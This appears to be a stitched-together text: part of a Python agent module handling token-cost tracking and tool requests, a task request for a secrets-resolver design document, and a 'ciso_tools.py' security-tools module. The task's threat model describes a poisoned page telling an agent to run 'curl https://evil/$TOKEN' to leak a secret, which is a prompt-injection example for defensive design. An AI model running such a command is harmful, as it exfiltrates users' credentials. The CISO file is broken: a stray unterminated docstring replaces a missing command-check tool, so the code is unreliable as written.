            _get_analytics().record_token_usage(
                username=self.user.username if self.user else "anonymous",
                project_name=self.settings.project_name or "",
                project_id=getattr(self.settings, "project_id", "") or "",
                model=rag_settings.model,
                provider=rag_settings.provider or "",
                input_tokens=input_tokens,
                output_tokens=output_tokens,
                duration_seconds=duration_seconds,
                session_id=session_id,
                tags=TOOL_ANALYSIS_TAG,
                input_k_tokens_cxjcoins=getattr(
                    rag_settings, "input_k_tokens_cxjcoins", 0.0
                ) or 0.0,
                output_k_tokens_cxjcoins=getattr(
                    rag_settings, "output_k_tokens_cxjcoins", 0.0
                ) or 0.0,
                request_id=None,
                chat_id=chat_id,
                tokens_from_provider=True,
            )
        except Exception as ex:
            logger.warning(
                "SmolAgent: failed to record tool analysis usage (non-fatal): %s",
                ex,
            )

    # ── Cost tracking (Chat.estimation_cost) ───────────────────────────────────

    @staticmethod
    def _accumulated_chat_cost(current_chat: Optional[Any]) -> float:
        """
        Return the accumulated cost of the chat in cxjcoins.

        Prefers ``Chat.cost`` — the deletion-safe accumulator maintained by
        ``ChatManager`` (it is NOT reduced when messages are deleted). Falls
        back to summing the cost registered on the chat's messages for chats
        persisted before the accumulator existed.

        Args:
            current_chat: The Chat object in context (may be ``None``).

        Returns:
            Total cost in cxjcoins accumulated so far (0.0 when unknown).
        """
        if not current_chat:
            return 0.0

        accumulated = getattr(current_chat, "cost", None)
        if accumulated is not None and accumulated > 0:
            return float(accumulated)

        return sum(
            getattr(message, "cost", 0.0) or 0.0
            for message in (getattr(current_chat, "messages", None) or [])
        )

    @staticmethod
    def _tool_cost(tool_result: Any) -> float:
        """
        Return the cost in cxjcoins reported by a tool result.

        Tools that perform their own AI calls (or otherwise incur cost) can
        report it on the :class:`ToolResponse` ``cost`` field. The cost is
        summed into the iteration total (billed on the returned message) and
        the chat total (used to enforce ``Chat.estimation_cost``).

        Args:
            tool_result: The value returned by a tool (str, ToolResponse, ...).

        Returns:
            The reported cost in cxjcoins (0.0 when not a ToolResponse or unset).
        """
        if isinstance(tool_result, ToolResponse):
            try:
                return float(getattr(tool_result, "cost", 0.0) or 0.0)
            except (TypeError, ValueError):
                logger.warning(
                    "SmolAgent: ignoring invalid ToolResponse.cost value: %r",
                    getattr(tool_result, "cost", None),
                )
                return 0.0
        return 0.0

    def _compute_cost(
        self,
        usage_info: Any,
        content: str,
        openai_messages: List[Dict[str, Any]],
    ) -> RoundCost:
        """
        Compute the token usage and cost in cxjcoins of a single completion round.

        Uses the provider-reported usage when available, falling back to a
        token-count estimate otherwise. Only the input/output token prices of
        the active model (``AISettings``) are used, matching the pricing model
        used by the analytics subsystem.

        Args:
            usage_info:      Provider-reported usage for this round (may be ``None``).
            content:         Text generated in this round (for output fallback).
            openai_messages: Conversation history sent in this round (for input fallback).

        Returns:
            A :class:`RoundCost` with tokens and input/output costs in cxjcoins
            (zeroed when no pricing is configured).
        """
        input_price = getattr(self.llm_settings, "input_k_tokens_cxjcoins", 0.0) or 0.0
        output_price = getattr(self.llm_settings, "output_k_tokens_cxjcoins", 0.0) or 0.0
        if not input_price and not output_price:
            return RoundCost()

        input_tokens = getattr(usage_info, "prompt_tokens", 0) or 0
        output_tokens = getattr(usage_info, "completion_tokens", 0) or 0

        if not input_tokens:
            input_text = "\n".join(
                m.get("content", "")
                for m in openai_messages
                if isinstance(m.get("content"), str)
            )
            input_tokens = count_tokens(input_text, model=self.model)
        if not output_tokens and content:
            output_tokens = count_tokens(content, model=self.model)

        return RoundCost(
            input_tokens=input_tokens,
            output_tokens=output_tokens,
            input_cost_cxjcoins=(input_tokens / 1000.0) * input_price,
            output_cost_cxjcoins=(output_tokens / 1000.0) * output_price,
        )

    @staticmethod
    def _cost_limit_exceeded(
        current_chat: Optional[Any],
        chat_cost: float,
    ) -> bool:
        """
        Return True when the accumulated chat cost reached ``estimation_cost``.

        A limit is enforced only when ``Chat.estimation_cost`` is set to a
        positive value; ``None`` or non-positive values disable the limit.

        Args:
            current_chat: The Chat object in context (may be ``None``).
            chat_cost:    Accumulated chat cost in cxjcoins.

        Returns:
            True when the chat budget has been reached or exceeded.
        """
        if not current_chat:
            return False
        limit = getattr(current_chat, "estimation_cost", None)
        if limit is None or limit <= 0:
            return False
        return chat_cost >= limit

    @staticmethod
    def _parse_tool_arguments(raw_arguments: Any, func_name: str) -> Dict[str, Any]:
        """
        Parse tool arguments that may arrive as a JSON string or a dict.

        Handles all edge cases from streaming delta accumulation:
        - ``dict``   → returned as-is (already parsed)
        - ``str``    → JSON-decoded; empty string treated as ``{}``
        - ``None``   → treated as ``{}`` (key present but value is None)
        - anything else → logged and treated as ``{}``

        Args:
            raw_arguments: The raw arguments payload (may be None from streaming).
            func_name:     Tool name (for logging).

        Returns:
            A dict of parsed arguments (empty on parse failure or missing args).
        """
        # Already a dict — return as-is
        if isinstance(raw_arguments, dict):
            return raw_arguments

        # None means the streaming accumulator never received an arguments chunk
        if raw_arguments is None:
            logger.warning(
                "SmolAgent: tool '%s' received None arguments – treating as {}",
                func_name,
            )
            return {}

        if isinstance(raw_arguments, str):
            # Empty or whitespace-only string: no arguments provided
            stripped = raw_arguments.strip()
            if not stripped:
                logger.warning(
                    "SmolAgent: tool '%s' received empty arguments string – treating as {}",
                    func_name,
                )
                return {}
            try:
                parsed = json.loads(stripped)
                if not isinstance(parsed, dict):
                    logger.error(
                        "SmolAgent: tool '%s' arguments parsed to non-dict type %s "
                        "(raw=%r) – treating as {}",
                        func_name,
                        type(parsed).__name__,
                        stripped[:200],
                    )
                    return {}
                logger.debug(
                    "SmolAgent: tool '%s' arguments parsed successfully: keys=%s",
                    func_name,
                    list(parsed.keys()),
                )
                return parsed
            except json.JSONDecodeError as ex:
                logger.error(
                    "SmolAgent: cannot parse arguments for tool '%s': %s "
                    "(raw=%r)",
                    func_name,
                    ex,
                    stripped[:200],
                )
                return {}

        # Unexpected type — log and return empty
        logger.error(
            "SmolAgent: tool '%s' received unexpected arguments type %s "
            "(value=%r) – treating as {}",
            func_name,
            type(raw_arguments).__name__,
            str(raw_arguments)[:200],
        )
        return {}

    @staticmethod
    def _sanitize_for_serialization(obj: Any) -> Any:
        """
        Recursively sanitize an object to remove non-serializable items
        (e.g., asyncio.Future, coroutines, Pydantic models).

        Args:
            obj: Object to sanitize.

        Returns:
            Serialization-safe version of the object.
        """
        if obj is None or isinstance(obj, (str, int, float, bool)):
            return obj

        if isinstance(obj, Future):
            return f"<{type(obj).__name__}>"

        if inspect.iscoroutine(obj):
            return f"<{type(obj).__name__}>"

        if hasattr(obj, 'model_dump'):
            # Pydantic model
            try:
                return SmolAgent._sanitize_for_serialization(obj.model_dump())
            except Exception:
                return str(obj)

        if isinstance(obj, dict):
            return {
                SmolAgent._sanitize_for_serialization(k): SmolAgent._sanitize_for_serialization(v)
                for k, v in obj.items()
            }

        if isinstance(obj, (list, tuple)):
            return [SmolAgent._sanitize_for_serialization(item) for item in obj]

        try:
            json.dumps(obj)
            return obj
        except (TypeError, ValueError):
            return str(obj)

    # ── Request building helpers ───────────────────────────────────────────────

    def _apply_reasoning_kwargs(self, kwargs: Dict[str, Any]) -> Dict[str, Any]:
        """
        Translate the configured reasoning controls into provider request fields.

        The Harness exposes a per-model reasoning effort (``off``/``low``/
        ``high``/``max``) and an explicit thinking switch. codx-junior ignored
        both, so every DeepSeek round ran with the provider's default thinking
        policy and the user could not trade latency for depth.

        DeepSeek's OpenAI-compatible endpoint takes the switch in ``extra_body``
        (``thinking: {type: disabled}``) and the effort as ``reasoning_effort``.
        For other OpenAI-compatible reasoning models only ``reasoning_effort``
        is sent; the DeepSeek-specific ``thinking`` field is never forwarded.

        Args:
            kwargs: Request kwargs being built (mutated and returned).

        Returns:
            The same dict with the reasoning fields applied.
        """
        effort = str(
            getattr(self.llm_settings, "reasoning_effort", "") or ""
        ).strip().lower()
        thinking = str(
            getattr(self.llm_settings, "thinking", "") or ""
        ).strip().lower()

        if not effort and not thinking:
            return kwargs

        if thinking in ("disabled", "off", "false", "0"):
            effort = "off"
        elif thinking in ("enabled", "on", "true", "1") and effort in ("", "auto"):
            effort = ""

        deepseek = self._uses_thinking_dialect([])
        if effort and deepseek and effort not in {"off", "low", "high", "max"}:
            logger.warning(
                "SmolAgent: invalid reasoning_effort %r for DeepSeek; "
                "expected off/low/high/max (ignored)",
                effort,
            )
            effort = ""

        if deepseek:
            extra_body = dict(kwargs.get("extra_body") or {})
            if effort == "off":
                extra_body["thinking"] = {"type": "disabled"}
                kwargs.pop("reasoning_effort", None)
            else:
                extra_body["thinking"] = {"type": "enabled"}
                if effort:
                    kwargs["reasoning_effort"] = effort
            kwargs["extra_body"] = extra_body
        elif effort and effort != "off":
            # OpenAI-style providers understand reasoning_effort; ``off`` is
            # expressed by simply not sending the field.
            kwargs["reasoning_effort"] = effort

        return kwargs

    def _build_request_kwargs(
        self,
        selected_tools: List[str],
        profile_names: Optional[List[str]] = None,
        orchestration_info: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Build the base kwargs for the OpenAI completion request.

        Tools are filtered by scope: global scope tools are always included
        regardless of selected_tools, while chat scope tools are selectively
        included based on the request configuration.

        CHANGED: the profile tools are added by the AGENT, not by the profile
        definition. ``profile_knowledge_search`` is enabled whenever profiles
        take part in the turn and ``profile_learning`` only for users allowed to
        change what profiles learn (see :meth:`_profile_tools_for_run`).

        ADDED — orchestration tools: a run supervisor receives ``orchestrator``;
        a worker card receives the baseline project toolset and never the
        orchestrator (see :meth:`_orchestration_tools_for_run`). Like the
        profile tools, they are decided per run by the agent and are not part of
        the profile definition.

        Args:
            selected_tools: Names of chat-scoped tools enabled for this
                           conversation. Global scope tools are added
                           automatically.
            profile_names:  Profiles taking part in the turn.
            orchestration_info: Parsed internal ``orchestration`` header.

        Returns:
            Dict of request kwargs (model, stream, tools, temperature).
        """
        kwargs: Dict[str, Any] = {
            "model": self.model,
            "stream": True,
            "stream_options": {"include_usage": True},
        }
        self._apply_reasoning_kwargs(kwargs)

        # A plain completion never receives tool schemas: there is no tool
        # loop for it, so a tool call would be unexecutable.
        if not self.harness:
            if self.llm_settings.temperature != 0:
                kwargs["temperature"] = float(self.llm_settings.temperature)
            return kwargs

        # Collect all enabled tools: global scope tools (always) + selected
        # chat scope tools + the profile tools decided for this run.
        selected_tool_set: Set[str] = set(selected_tools) if selected_tools else set()

        # Expand the all-tools marker: a profile (the codx-junior harness) may
        # grant every tool at once. Tools managed per run by the agent
        # (profile knowledge write/read) are never granted by an allowlist, so
        # the marker cannot smuggle them past the user rights checks.
        if ALL_TOOLS_MARKER in selected_tool_set:
            selected_tool_set = set(expand_tool_allowlist(selected_tool_set))
            logger.info("SmolAgent: expanded all-tools marker (%d tools)", len(selected_tool_set))

        profile_tools = self._profile_tools_for_run(profile_names or [])
        if profile_tools:
            selected_tool_set.update(profile_tools)
            logger.info(
                "SmolAgent: injecting profile tools %s for profiles %s",
                profile_tools,
                profile_names,
            )

        # MCP tools are project-scoped and named mcp_<server>_<tool>. They are
        # only loaded when a profile explicitly grants one (or mcp_<server>_*),
        # so a project can register a CRM without every profile seeing it.
        mcp_tool_names = self._load_mcp_tools(selected_tool_set)
        if mcp_tool_names:
            selected_tool_set.update(mcp_tool_names)
            logger.info("SmolAgent: injecting MCP tools %s", mcp_tool_names)

        orchestration_tools = self._orchestration_tools_for_run(orchestration_info)
        if orchestration_tools:
            selected_tool_set.update(orchestration_tools)
            logger.info(
                "SmolAgent: injecting orchestration tools %s (role=%s)",
                orchestration_tools,
                (orchestration_info or {}).get("role"),
            )

        # Never let a profile definition smuggle a control tool into the wrong
        # role: a worker must not plan (recursive orchestration), and a
        # supervisor must not run a synchronous delegate from inside the run
        # loop (its work is the plan itself).
        if orchestration_info:
            role = orchestration_info.get("role")
            if role == "supervisor":
                selected_tool_set.discard(ORCHESTRATION.DELEGATE_TOOL)
            elif role == "worker":
                selected_tool_set.discard(ORCHESTRATION.ORCHESTRATOR_TOOL)
                selected_tool_set.discard(ORCHESTRATION.DELEGATE_TOOL)

        # Project atlas policy: the atlas tools are always available when the
        # atlas is enabled. Discovery is atlas-only (grep/glob/search are not
        # registered anymore), so this gate grants them to every profile that
        # can read project files, including a profile saved with "*".
        selected_tool_set = apply_atlas_policy(
            selected_tool_set, getattr(self, "settings", None)
        )

        enabled_tools: List[Dict[str, Any]] = []

        for tool in self.tools:
            tool_name: str = tool["tool_json"]["function"]["name"]
            tool_scope: str = tool.get("settings", {}).get("scope", TOOL_SCOPE_CHAT)

            # Include tool if it's global or explicitly selected.
            if tool_scope == TOOL_SCOPE_GLOBAL or tool_name in selected_tool_set:
                enabled_tools.append(tool["tool_json"])
                if tool_scope == TOOL_SCOPE_GLOBAL:
                    logger.debug(
                        "SmolAgent: including global scope tool '%s'", tool_name
                    )

        if enabled_tools:
            kwargs["tools"] = enabled_tools

        if self.llm_settings.temperature != 0:
            kwargs["temperature"] = float(self.llm_settings.temperature)

        return kwargs

    def _build_tags(self, headers: Dict[str, str]) -> str:
        """
        Build the comma-separated analytics tag string.

        Args:
            headers: Request headers possibly containing a ``tags`` entry.

        Returns:
            Comma-joined tag string.
        """
        tags = headers.get("tags", "").split(",") + [
            f"temperature:{self.llm_settings.temperature}",
            self.settings.project_name or "",
        ]
        if self.user:
            tags.append(f"user:{self.user.username}")
        return ",".join(tag for tag in tags if tag)

    @staticmethod
    def _make_callback_sender(
        callbacks: Optional[List[Callable[[str], None]]],
    ) -> Callable[[str, bool], None]:
        """
        Return a closure that batches streamed chunks and flushes the FULL
        ACCUMULATED response to callbacks.

        The argument passed to ``send_callback`` is treated as a **delta**
        (a new chunk). It is appended to the internal buffer/accumulator and
        the FULL accumulated response is emitted on flush. Callers MUST NOT
        pass content that has already been sent — doing so would re-emit it.

        flowchart TD
            A[chunk arrives] --> B[Append to buffer]
            B --> C{flush or interval elapsed?}
            C -->|No| D[Return - keep buffering]
            C -->|Yes| E[Move buffer into accumulated]
            E --> F[Join FULL accumulated content]
            F --> G[Invoke callbacks with full content]

        Args:
            callbacks: Callables accepting a str containing the FULL response
                       accumulated so far (may be ``None``).

        Returns:
            A ``send_callback(chunk, flush)`` function.
        """
        state: Dict[str, Any] = {
            "buffer": [],        # chunks pending since the last flush
            "accumulated": [],   # ALL chunks flushed so far (full response)
            "ts": datetime.now(),
        }

        def send_callback(chunk_content: str, flush: bool = False) -> None:
            """Buffer *chunk_content*; flush the FULL accumulated response periodically."""
            if not callbacks:
                return
            state["buffer"].append(chunk_content or "")
            elapsed = (datetime.now() - state["ts"]).total_seconds()
            if flush or elapsed > CALLBACK_FLUSH_SECONDS:
                state["ts"] = datetime.now()
                # Move the pending delta into the accumulated response and
                # send the COMPLETE content so far: never just the delta.
                # This keeps mid-stream persistence crash-safe: any partial
                # save always contains everything streamed up to that point.
                state["accumulated"].extend(state["buffer"])
                state["buffer"] = []
                message = "".join(state["accumulated"])
                for callback in callbacks:
                    try:
                        callback(message)
                    except OSError as ex:
                        logger.exception("SmolAgent: error in callback: %s", ex)

        return send_callback

    # ── Analytics ──────────────────────────────────────────────────────────────

    def _preflight_limit_check(self) -> None:
        """
        Run the pre-flight wallet check before executing an AI request.

        Raises:
            InsufficientFundsError: When the user has exhausted their budget.
        """
        input_cost = getattr(self.llm_settings, "input_k_tokens_cxjcoins", 0.0) or 0.0
        output_cost = getattr(self.llm_settings, "output_k_tokens_cxjcoins", 0.0) or 0.0
        if input_cost or output_cost:
            check_user_wallet(user=self.user)

    def _record_usage(
        self,
        openai_messages: List[Dict[str, Any]],
        output_text: str,
        thinking_text: str,
        duration_seconds: float,
        tags: str,
        session_id: Optional[str],
        request_id: Optional[str],
        usage_info: Any,
        chat_id: Optional[str],
        tool_cache: Optional[ToolCache] = None,
    ) -> None:
        """
        Record token usage to analytics (non-fatal on error).

        Includes tool cache statistics in analytics for visibility into
        cache performance. Usage is calculated based on both thinking
        and final answer content produced by the model.

        Args:
            openai_messages:  Full conversation sent to the model.
            output_text:      Final answer content (the final response).
            thinking_text:    Thinking content (tool-calling rounds text).
            duration_seconds: Total wall-clock duration.
            tags:             Analytics tag string.
            session_id:       Session identifier.
            request_id:       Last request identifier.
            usage_info:       Provider-reported token usage (may be ``None``).
            chat_id:          Chat identifier.
            tool_cache:       Tool cache for this conversation (optional).
        """
        try:
            input_tokens = getattr(usage_info, "prompt_tokens", 0) or 0
            output_tokens = getattr(usage_info, "completion_tokens", 0) or 0
            tokens_from_provider = bool(input_tokens)

            if not input_tokens:
                input_text = "\n".join(
                    m.get("content", "")
                    for m in openai_messages
                    if isinstance(m.get("content"), str)
                )
                input_tokens = count_tokens(input_text, model=self.model)
            if not output_tokens:
                # Count tokens for both thinking and final answer content
                combined_output = thinking_text + output_text
                output_tokens = count_tokens(combined_output, model=self.model)

            # Augment tags with cache statistics if available
            cache_tags = tags
            if tool_cache:
                cache_stats = tool_cache.stats()
                cache_tags += (
                    f",cache_hits:{cache_stats['hits']},"
                    f"cache_misses:{cache_stats['misses']},"
                    f"cache_hit_rate:{cache_stats['hit_rate']}"
                )

            _get_analytics().record_token_usage(
                username=self.user.username if self.user else "anonymous",
                project_name=self.settings.project_name or "",
                project_id=getattr(self.settings, "project_id", "") or "",
                model=self.model,
                provider=self.llm_settings.provider or "",
                input_tokens=input_tokens,
                output_tokens=output_tokens,
                duration_seconds=duration_seconds,
                session_id=session_id,
                tags=cache_tags,
                input_k_tokens_cxjcoins=getattr(
                    self.llm_settings, "input_k_tokens_cxjcoins", 0.0
                ) or 0.0,
                output_k_tokens_cxjcoins=getattr(
                    self.llm_settings, "output_k_tokens_cxjcoins", 0.0
                ) or 0.0,
                request_id=request_id,
                tokens_from_provider=tokens_from_provider,
                chat_id=chat_id,
            )
        except OSError as ex:
            logger.warning("SmolAgent: _record_usage failed (non-fatal): %s", ex)

    def _record_tool_usage(
        self,
        tool_name: str,
        time_taken: float,
        success: bool,
        error_message: Optional[str],
        chat_id: Optional[str],
        request_id: Optional[str],
    ) -> None:
        """
        Record a tool execution event to analytics (non-fatal on error).

        Args:
            tool_name:     Name of the executed tool.
            time_taken:    Execution duration in seconds.
            success:       Whether the tool executed successfully.
            error_message: Error details when execution failed.
            chat_id:       Parent chat identifier.
            request_id:    Triggering LLM request identifier.
        """
        try:
            _get_analytics().record_tool_usage(
                name=tool_name,
                username=self.user.username if self.user else "anonymous",
                project_name=self.settings.project_name or "",
                project_id=getattr(self.settings, "project_id", "") or "",
                time_taken=time_taken,
                success=success,
                error_message=error_message,
                chat_id=chat_id,
                request_id=request_id,
            )
        except Exception as ex:
            logger.warning("SmolAgent: _record_tool_usage failed (non-fatal): %s", ex)

request.description:
`api/codx/junior/security/ciso/vault.py` points at `docs/design/secrets-resolver.md` as its design rationale, and that file does not exist in the repository. Write it.

Content required:
1. Threat model: why shell interpolation (`${SECRET_ENV}` inside `command`) is the unsafe variant — the value lands in `echo`, error strings, substrings, base64 blobs, and a poisoned page can ask for `curl https://evil/$TOKEN`.
2. Ecosystem comparison table: GHA `${{ secrets.X }}`, K8s `secretKeyRef`, `op run --` / `doppler run` / `sops exec-env`, MCP OAuth + elicitation, LangChain `SecretStr`.
3. The five laws: handle not value; closed sink list; out-of-band elicitation; per-step allowlist; audit names only.
4. Resolver contract: `{{secret:NAME}}` / `{{env:NAME}}`, sinks `env` and `stdin` implemented, `file` and `header` declared but refused.
5. Storage layout: `.codx/secrets/meta.json`, `vault.json` (Fernet, 0600), `audit.jsonl`; `CODX_JUNIOR_VAULT_KEY`; `cryptography` is optional and its absence degrades to `vault_unavailable` — never plaintext.
6. `ciso_policy.secrets` schema: enabled, allow_env_source, require_grant, audit, denied_tools, supported_sinks.
7. Hook table with exact file:line: `smol_agent.py::_execute_tool` (TOOL_START emits `args=dict(params)` before resolution; `redact_result` before the preview/cache/return), `tools/__init__.py` registry, `ciso_tools.py`.
8. Known limits: redaction is lossy (hex, chunked, re-encoded values escape), `{{env:NAME}}` trusts the process environment, interactive login passwords belong in the browser/vault path, not env.

Acceptance: document exists, matches the implemented code (no aspirational features described as done), and every claim about behaviour is traceable to a line in `vault.py` or the dispatcher hook.

```py api/codx/junior/tools/ciso_tools.py
"""CISO security tools.

These are the tools the ``ciso`` profile (and any profile granted them) uses to
audit a project, review a change before it is committed or merged, validate a
payload before writing it, check a shell command and neutralise secrets in a
text that is about to be shared.

Two of them are also used as gates by other processes: ``security_review_changes``
is the pull-request gate and ``security_check_command`` is the command gate.
Gates that run automatically inside a process live in
:mod:`codx.junior.security.ciso.gate`, not here: a tool is an explicit action,
a gate is an implicit guarantee.

Made with ❤️ by codx-junior
"""

import logging
import os
from typing import Any, Dict, List, Optional

from .model import ToolResponse
from codx.junior.security.ciso import (
    CisoPolicy,
    SecurityDomain,
    gate,
    policy as ciso_policy,
    render_report,
    resolve_policy,
    scan_content,
    scan_diff,
    scan_project,
)
from codx.junior.security.ciso import secrets as ciso_secrets
from codx.junior.security.ciso import vault as ciso_vault

logger = logging.getLogger(__name__)


# -----------------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------------
def _settings_of(kwargs: Dict[str, Any]):
    """Return the project settings injected by the runtime (or ``None``)."""
    return kwargs.get("settings")


def _project_path(settings: Any) -> str:
    """Return the absolute project path of *settings*."""
    return getattr(settings, "abs_project_path", None) or os.getcwd()


def _verdict_answer(verdict, title: str) -> str:
    """Render a verdict as the user facing markdown report."""
    return render_report(verdict, title=title)


def _llm_summary(verdict, subject: str) -> str:
    """Build the compact machine friendly summary for the model."""
    lines = [
        f"# {subject}",
        f"- decision: {verdict.action.value}",
        f"- blocked: {verdict.blocked}",
        f"- requires_approval: {verdict.requires_approval}",
        f"- highest_severity: {(verdict.highest_severity.value if verdict.highest_severity else 'none')}",
        f"- risk_score: {verdict.risk_score}",
        f"- findings: {len(verdict.findings)}",
    ]
    for finding in verdict.findings[:10]:
        location = finding.path or "-"
        if finding.line:
            location = f"{location}:{finding.line}"
        lines.append(
            f"- [{finding.severity.value}] {finding.rule_id} @ {location}: "
            f"{finding.remediation or finding.reason}"
        )
    if len(verdict.findings) > 10:
        lines.append(f"- … {len(verdict.findings) - 10} more finding(s)")
    return "\n".join(lines)


def _git_diff(settings: Any, base: str, scope: str, paths: Optional[List[str]]) -> str:
    """Return the unified diff requested by the caller.

    Args:
        settings: Project settings.
        base: Git reference to compare against.
        scope: ``all`` | ``staged`` | ``unstaged``.
        paths: Optional path filter.

    Returns:
        str: Unified diff (empty when there is nothing to review).
    """
    from .project_tools import _run_git

    args: List[str] = ["diff", "--no-ext-diff", "--no-textconv", "--no-color", "-U3"]
    if scope == "staged":
        args.append("--cached")
    elif scope == "all":
        args.append(base or "HEAD")

    if paths:
        args += ["--", *paths]

    ok, stdout, stderr = _run_git(settings, args)
    if not ok:
        raise ValueError(f"git diff failed: {(stderr or '').strip()}")
    return stdout or ""


# -----------------------------------------------------------------------------
# Tools
# -----------------------------------------------------------------------------
def security_audit(
    path: Optional[str] = None,
    max_files: int = 200,
    include_dependency_files: bool = True,
    **kwargs
) -> ToolResponse:
    """Audit a project (or a sub path) for secrets, malicious code and injection.

    Scans the files of the project with every CISO detector and returns a
    Markdown report plus a machine friendly summary.

    Args:
        path: Optional project-relative folder or file to restrict the audit.
        max_files: Maximum number of files read (default 200).
        include_dependency_files: Also scan lock files / manifests
            (still skipped: vendored folders such as ``node_modules``).
        **kwargs: Runtime arguments; ``settings`` is injected automatically.

    Returns:
        ToolResponse: Report, summary and the scan logs.

    Example:
        >>> security_audit(path="api/")  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    if not settings:
        raise Exception("Invalid project settings")

    project_path = _project_path(settings)
    policy = resolve_policy(settings)

    targets = None
    if path:
        absolute = path if os.path.isabs(path) else os.path.join(project_path, path)
        if os.path.isdir(absolute):
            from codx.junior.security.ciso.scanner import iter_project_files

            targets = iter_project_files(absolute, max_files=max_files, policy=policy)
        elif os.path.isfile(absolute):
            targets = [absolute]
        else:
            return ToolResponse(
                user_response=f"⚠️ Path not found: `{path}`",
                llm_response=f"security_audit: path not found: {path}",
            )

    verdict = scan_project(
        project_path,
        max_files=max_files,
        domain=SecurityDomain.FILE_READ,
        policy=policy,
        paths=targets,
    )

    title = f"CISO audit — {getattr(settings, 'project_name', 'project')}"
    if path:
        title += f" — `{path}`"

    logs = [
        f"CISO audit: {verdict.summary}",
        f"CISO audit: decision={verdict.action.value} blocked={verdict.blocked}",
    ]
    for finding in verdict.findings[:25]:
        logs.append(
            f"[{finding.severity.value.upper()}] {finding.rule_id} "
            f"{finding.path}:{finding.line or 0} — {finding.title}"
        )

    return ToolResponse(
        user_response=_verdict_answer(verdict, title),
        llm_response=_llm_summary(verdict, "CISO audit"),
        logs=logs,
    )


def security_scan_content(
    content: str,
    path: Optional[str] = None,
    domain: str = "file_write",
    **kwargs
) -> ToolResponse:
    """Scan a payload before writing, committing or sharing it.

    Use it to validate a file body *before* calling ``project_write_file`` or
    ``apply_file_changes``: it reports whether the content would be blocked and
    returns a redacted version when it carries secrets.

    Args:
        content: Exact payload to inspect.
        path: Target path (drives the reported location).
        domain: Integration point: ``file_write`` (default), ``git_commit``,
            ``model_output``, ``knowledge_ingestion``, ``profile``.

    Returns:
        ToolResponse: Report; the summary includes the redacted payload when
        secrets were neutralised.

    Example:
        >>> security_scan_content('TOKEN="<your-token>"')  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    policy = resolve_policy(settings)

    try:
        domain_value = SecurityDomain(domain)
    except ValueError:
        return ToolResponse(
            user_response=f"⚠️ Unknown domain `{domain}`. Valid: "
                          f"{', '.join(d.value for d in SecurityDomain)}",
            llm_response=f"security_scan_content: invalid domain {domain}",
        )

    verdict = scan_content(content, path=path, domain=domain_value, policy=policy)

    llm_summary = _llm_summary(verdict, "CISO content scan")
    if verdict.redacted_text is not None:
        llm_summary += (
            "\n\n## Redacted payload (safe to write)\n```\n"
            + verdict.redacted_text
            + "\n```\nUse this content instead of the original."
        )

    return ToolResponse(
        user_response=_verdict_answer(verdict, f"CISO scan — `{path or 'inline content'}`"),
        llm_response=llm_summary,
        logs=[f"CISO content scan: {verdict.summary}"],
    )


def security_review_changes(
    base: str = "HEAD",
    scope: str = "all",
    paths: Optional[List[str]] = None,
    **kwargs
) -> ToolResponse:
    """Review a change (working tree, staged or against a ref) before shipping it.

    This is the pull-request gate: only the **added** lines are inspected and
    the reported line numbers are the new file coordinates.

    Args:
        base: Git reference to compare against (default ``HEAD``).
        scope: ``all`` (working tree + staged vs base), ``staged`` (next commit)
            or ``unstaged`` (working tree vs index).
        paths: Optional list of paths to restrict the review.

    Returns:
        ToolResponse: Report of the change.

    Example:
        >>> security_review_changes(scope="staged")  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    if not settings:
        raise Exception("Invalid project settings")

    policy = resolve_policy(settings)
    domain = SecurityDomain.GIT_COMMIT if scope == "staged" else SecurityDomain.PULL_REQUEST

    try:
        patch = _git_diff(settings, base=base, scope=scope, paths=paths)
    except Exception as ex:
        return ToolResponse(
            user_response=f"⚠️ Could not read the change: {ex}",
            llm_response=f"security_review_changes: {ex}",
        )

    if not (patch or "").strip():
        return ToolResponse(
            user_response="✅ No pending changes to review.",
            llm_response="security_review_changes: empty diff, nothing to review.",
        )

    verdict = scan_diff(patch, domain=domain, policy=policy)
    return ToolResponse(
        user_response=_verdict_answer(verdict, f"CISO review — scope `{scope}` vs `{base}`"),
        llm_response=_llm_summary(verdict, "CISO change review"),
        logs=[f"CISO change review: {verdict.summary}"],
    )

    """Check a shell command before running it.

def security_redact(text: str, **kwargs) -> ToolResponse:
    """Neutralise every detected secret inside *text*.

    Use it before sharing a log, a configuration file or a diff outside the
    project.

    Args:
        text: Payload to sanitise.

    Returns:
        ToolResponse: user_response carries the redacted text; the summary
        reports how many values were replaced.

    Example:
        >>> security_redact('token: <your-token-here>')  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    policy = resolve_policy(settings)
    redacted, replacements = ciso_secrets.redact_text(text or "", policy)
    return ToolResponse(
        user_response=redacted if replacements else "_No secret detected._\n\n" + (text or ""),
        llm_response=(
            f"{replacements} secret(s) redacted.\n\n```\n{redacted}\n```"
            if replacements
            else "No secret detected."
        ),
        logs=[f"CISO redact: {replacements} replacement(s)"],
    )


def secrets_list(**kwargs) -> ToolResponse:
    """List the secrets the runtime can resolve — never their values.

    Use the returned names in a handle (``{{secret:NAME}}`` or ``{{env:NAME}}``)
    as the WHOLE value of the ``env`` map or of the ``stdin`` argument. A handle
    anywhere else (inside a command, a URL or a description) is refused.

    Args:
        **kwargs: Runtime injected settings.

    Returns:
        ToolResponse: The declared secrets with their availability.

    Example:
        >>> secrets_list()  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    vault = ciso_vault.vault_for(settings)
    entries = vault.list()
    if not entries:
        return ToolResponse(
            user_response="No secret is declared for this project.",
            llm_response="secrets_list: no secret declared. Declare one with secrets_request.",
            logs=["CISO secrets: 0 declared"],
        )
    rows = [
        "| Name | Source | Status | Allowed tools | Description |",
        "| --- | --- | --- | --- | --- |",
    ]
    for meta in entries:
        tools = ", ".join(meta.allow_tools) or "-"
        rows.append(
            f"| `{meta.name}` | {meta.source} | {meta.status} | {tools} | "
            f"{meta.description or '-'} |"
        )
    rows.append("")
    rows.append(
        "A handle must be the WHOLE value of `env.<NAME>` or `stdin`, e.g. "
        '`{"command": "docker login --password-stdin registry.local", '
        '"stdin": "{{secret:NAME}}"}`. A handle inside `command` is rejected.'
    )
    return ToolResponse(
        user_response="\n".join(rows),
        llm_response="\n".join(
            f"- {meta.name} [{meta.source}] {meta.status}" for meta in entries
        ),
        logs=[f"CISO secrets: {len(entries)} declared"],
    )

